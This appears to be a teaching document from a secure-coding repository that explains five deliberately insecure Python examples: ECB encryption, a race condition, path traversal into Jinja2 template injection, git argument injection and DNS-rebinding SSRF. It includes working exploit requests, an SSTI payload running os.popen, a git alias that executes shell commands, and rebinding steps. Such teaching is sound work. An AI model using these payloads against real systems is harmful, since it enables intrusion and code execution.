# Contents

- [WeakEncryption.py](#weakencryptionpy)
- [RaceCondition.py](#raceconditionpy)
- [PathTraversal.py](#pathtraversalpy)
- [ArgumentInjection.py](#argumentinjectionpy)
- [ServerSideRequestForgery.py](#serversiderequestforgerypy)
&nbsp;

## [WeakEncryption.py](../../examples/insecure/python/WeakEncryption.py)
Path: `/examples/insecure/python/WeakEncryption.py`

### Explanation

- It is not recommended to use ECB (Electronic Codebook) mode in AES encryption (line 1) because this mode encrypts data block by block without proper randomization. Instead, CBC (Cipher Block Chaining) mode or other cryptographically secure methods should be used. 

- When encryption is performed using ECB, patterns in the input data can still be observed in the output, making it insecure for certain types of data, especially images. For example:
   - If a block of data (a byte) is changed, only the specific block in the output is affected and the rest remains unchanged. This behavior is not suitable for encryption of sensitive or visual data.

- A visual example of ECB's block-by-block encoding is the well-known "ECB Tux" image:  
  ![ECB Tux Example](../../docs/img/ecb-tux.jpg)  
  As seen in this example, the penguin shape remains recognizable in the encrypted image, demonstrating ECB's vulnerability.

To better understand this vulnerability, I recommend reviewing the resources listed under cryptography in [Articles.md](../../docs/references/Articles.md).


&nbsp;


## [RaceCondition.py](../../examples/insecure/python/RaceCondition.py)

Path: `/examples/insecure/python/RaceCondition.py`

### Explanation

You cannot perform a directory traversal attack due to line 9. However, Absolute Path Manipulation + Arbitrary File Write via Race Condition can be applied

**Absolute Path Manipulation (`os.path.join`)**  
```python
src = os.path.join('contrib', 'languages', language_name)  # e.g., language_name = "/tmp/storage/malicious.tar"
```  
**Behavior and Vulnerability:**  

- If `language_name` contains an absolute path (e.g., `/tmp/storage/malicious.tar`), `os.path.join` **ignores previous components**:  
  ```python
  src = os.path.join('contrib', 'languages', '/tmp/storage/malicious.tar') 
  # Result: /tmp/storage/malicious.tar (removes contrib/languages/)

  dst = os.path.join('/tmp/extract', '/tmp/storage/malicious.tar') 
  # Result: /tmp/storage/malicious.tar (removes /tmp/extract)
  ```

- Since `src` and `dst` **point to the same file**, `shutil.copy` may raise a **SameFileError**. However, an attacker can bypass this error using a Race Condition attack.  

**Exploiting `shutil.copy` with a Race Condition**  
```python
shutil.copy(src, dst)  # Fails if source and destination are the same, BUT...
```  

1. **Step 1: Upload a Malicious TAR File via `/upload`**  
   ```bash
   curl -F "data=@malicious.tar" http://arastaci.com/upload -H "Content-Disposition: attachment; filename='/tmp/storage/malicious.tar'"
   ```  
   - The file is stored as `/tmp/storage/malicious.tar`.

2. **Step 2: Trigger the `install` Endpoint**  
   ```bash
   curl "http://arastaci.com/install?language_name=/tmp/storage/malicious.tar"
   ```

3. **Step 3: Quickly Delete the File (`/clean`)**  
   ```bash
   curl "http://arastaci.com/clean?file=/tmp/storage/malicious.tar"
   ```

#### **How the Race Condition Works:**  
- `shutil.copy` executes in **two steps**:  
  - If an attacker deletes `src` **after the existence check** but **before the copy operation**, `shutil.copy` **fails silently**.  
  - This does **not** prevent `unpack_archive(dst, extract_dir='/tmp/extract')` from executing, allowing the extraction of malicious files.  


&nbsp;

## [PathTraversal.py](../../examples/insecure/python/PathTraversal.py)

Path: `/examples/insecure/python/PathTraversal.py`

### Explanation

**Path Traversal + SSTI (Server-Side Template Injection)**  

At line 23, the username parameter received during user registration is directly appended to the file path.

**Issue:**  
- If the username parameter is set to `../templates/error.html`, the **notes_file** path resolves to `templates/error.html`. This allows overwriting the template file.

- Since templates/error.html is within the application’s root directory (app.root_path), **the validation does not fail**.


#### **Register with a Malicious Username**
```markdown
POST /register HTTP/1.1
...
username=../templates/error.html&password=test
```
- notes_file resolves to notes/../templates/error.html → templates/error.html

#### **Inject an SSTI Payload**
```markdown
POST /notes HTTP/1.1
...
notes={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
- This writes a malicious Jinja2 template payload into error.html

#### **Trigger the Error Page**
```markdown
GET /register?username=guest  # "Username already taken!" error
```
- The error.html template is rendered, executing the payload → **Displays the output of the `id` command**.

&nbsp;

## [ArgumentInjection.py](../../examples/insecure/python/ArgumentInjection.py)

Path: `/examples/insecure/python/ArgumentInjection.py`

### **Explanation**

At line 9, the `/blame` endpoint directly passes the user-supplied `what[]` parameter to the `git blame` command.

**Issue:**  
  The `file` and `lines` parameters are included in **git blame** without validation.  
  An attacker can inject Git arguments like `--output`, leading to filesystem manipulation.

### **Exploitation: Inject Malicious Parameters**
```markdown
POST /blame HTTP/1.1
...
what[]=--output=../../.git/HEAD:1
```
- Executes: `git blame -L 1 --output=../../.git/HEAD`
- Result: The `.git/HEAD` file **gets truncated (emptied)**.

#### **Exploiting Git's Behavior**
When `.git/HEAD` is corrupted, Git searches for a **bare repository** in parent directories.

If the attacker places a fake Git configuration in the root directory:
```ini
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
[alias]
    blame = !sh -c 'id > /tmp/pwned' #
```
The next **git blame** execution triggers the **custom alias**, executing the `id` command.

&nbsp;

## [ServerSideRequestForgery.py](../../examples/insecure/python/ServerSideRequestForgery.py)

Path: `/examples/insecure/python/ServerSideRequestForgery.py`

### Explanation

The `/avatar/<avatar>` endpoint follows a two-step process:  
1. **DNS Resolution (Validation)** → Handled by the `is_their_service_broken` function on **line 14**.  
2. **HTTP Request Execution** → Occurs on **line 17**.

**Issue:**  
An attacker can exploit a time-of-check to time-of-use (TOCTOU) race condition between two DNS queries:  
- During the first resolution, the hostname resolves to a public IP (validation passes).  
- Before the second resolution, the attacker changes the DNS record to return a private IP (gaining access to internal services).

**Exploitation:**
1. Use `rbndr.us` to create a hostname, e.g., `example.01010101.0a004a8c.rbndr.us`.  
2. Initially, this hostname points to `1.1.1.1` (a public IP).  
3. The `is_their_service_broken` function resolves the hostname and determines it points to a public IP, returning **True**.  
4. **Quickly update** the DNS record to point to `10.0.74.140` (a private IP).  
5. The `requests.get` function resolves the hostname again this time to the **private IP** and sends an HTTP request, allowing access to internal systems.

This attack is especially effective if **DNS caching is disabled or TTL (Time to Live) is short**.

&nbsp;